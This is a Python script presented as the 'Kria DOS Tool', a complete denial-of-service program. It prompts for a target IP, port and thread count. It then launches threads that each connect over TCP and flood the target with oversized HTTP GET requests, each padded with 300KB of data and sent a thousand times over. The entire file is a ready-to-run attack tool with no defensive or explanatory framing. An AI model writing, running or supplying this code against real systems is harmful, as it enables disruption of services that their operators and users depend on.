import socket
import threading
import time
from colorama import init, Fore
from datetime import datetime

init()

def create_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return sock
    except socket.error as err:
        print(f"{Fore.RED}Socket creation error: {err}")
        return None

def attack_thread(target_ip, target_port):
    try:
        sock = create_socket()
        if sock:
            sock.connect((target_ip, target_port))
            # Paket boyutu değişkeni
            payload = "X" * 307200  # 300KB data
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"
            sock.send(request.encode() * 1000)
            sock.close()
    except Exception as e:
        print(f"{Fore.RED}Connection error: {e}")

def start_attack():
    print(f"{Fore.BLUE}[*] Kria DOS Tool")

    target = input(f"{Fore.BLUE}Enter Target IP: ")
    port = int(input("Enter Target Port (default 80): ") or "80")
    threads = int(input("Enter number of threads: "))
    

    print(f"\n{Fore.RED}[*] Starting DOS...")
    
    for _ in range(threads):
        thread = threading.Thread(
            target=attack_thread,
            args=(target, port)
        )
        thread.start()
        print(f"{Fore.RED}[+] Thread {_ + 1} started")
        time.sleep(0.01)

    print(f"\n{Fore.BLUE}[*] Packages Sent Succesfully")

try:
    start_attack()
except KeyboardInterrupt:
    print(f"\n{Fore.RED}[!] Test stopped by user")
except Exception as e:
    print(f"{Fore.RED}[!] Error: {e}")
finally:
    print(f"{Fore.RESET}")